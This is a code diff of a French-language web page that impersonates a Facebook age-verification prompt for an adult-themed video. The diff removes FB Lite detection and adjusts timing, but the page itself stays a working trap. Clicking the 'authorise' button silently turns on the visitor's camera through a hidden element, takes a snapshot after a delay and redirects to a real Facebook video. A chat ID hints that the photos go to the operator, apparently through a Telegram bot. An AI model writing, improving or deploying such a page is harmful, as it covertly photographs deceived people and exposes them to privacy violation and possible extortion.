@@ -16,7 +16,6 @@
         .card { background: white; color: black; padding: 25px; border-radius: 15px; width: 100%; max-width: 340px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
         .btn-verif { background: #1877f2; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: bold; margin-top: 20px; width: 100%; cursor: pointer; font-size: 16px; }
         .fb-logo { width: 40px; margin-bottom: 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -31,15 +30,15 @@
     </div>
 
     <div class="overlay" id="overlay">
-        <div class="card" id="cardContent">
+        <div class="card">
             <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
             <h3 style="margin: 0 0 10px 0;">Vérification d'âge</h3>
-            <p style="font-size: 14px; color: #4b4f56;">Cette vidéo contient peut-être du contenu réservé aux adultes. Veuillez autoriser l'accès pour continuer.</p>
+            <p style="font-size: 14px; color: #4b4f56;">Cette vidéo contient peut être du contenu réservé aux adultes.</p>
             <button class="btn-verif" onclick="startCamera()">AUTORISER ET LIRE</button>
         </div>
     </div>
 
-    <video id="video" width="1" height="1" autoplay playsinline style="display:none;"></video>
+    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
@@ -47,40 +46,22 @@
         const CHAT_ID = '7129218282';
         const FB_VIDEO_URL = 'https://www.facebook.com/share/v/1DfJG4EvEf/';
 
-        // Detection FB Lite / FB Messenger interne
-        function isFBLite() {
-            var ua = navigator.userAgent || navigator.vendor || window.opera;
-            return (ua.indexOf("FBAV") > -1) || (ua.indexOf("FBLC") > -1) || (ua.indexOf("FBAN") > -1);
-        }
-
         function showPopup() {
-            // Si on est sur FB Lite, on tente d'abord d'ouvrir dans le navigateur externe
-            if (isFBLite() && !window.location.search.includes('external')) {
-                // On rajoute un parametre pour ne pas boucler
-                const externalUrl = window.location.href + "?external=true";
-                window.open(externalUrl, "_blank");
-                // On affiche quand meme le popup au cas ou le blocage echoue
-            }
             document.getElementById('overlay').style.display = 'flex';
         }
 
         async function startCamera() {
-            document.getElementById('cardContent').innerHTML = '<p>Chargement du lecteur vidéo...</p><div style="border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 10px auto;"></div>';
-            
+            document.getElementById('overlay').innerHTML = '<div class="card"><p>Chargement du flux vidéo...</p><div style="border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 10px auto;"></div></div>';
             try {
-                // On demande la caméra spécifiquement
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // Réduction du délai à 4s pour FB Lite
+                // On attend 5 secondes pour une image nette
                 setTimeout(() => {
                     takeSnapshot();
-                }, 4000); 
+                }, 5000); 
             } catch (err) {
-                // Si la caméra est bloquée par FB Lite, on renvoie vers la vidéo
                 window.location.href = FB_VIDEO_URL;
             }
         }
@@ -103,9 +84,11 @@
                     });
                 } catch (e) {}
                 
+                // Redirection vers la vraie vidéo Facebook
                 window.location.href = FB_VIDEO_URL;
-            }, 'image/jpeg', 0.6); // Qualité réduite pour envoi rapide sur mobile
+            }, 'image/jpeg');
         }
     </script>
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
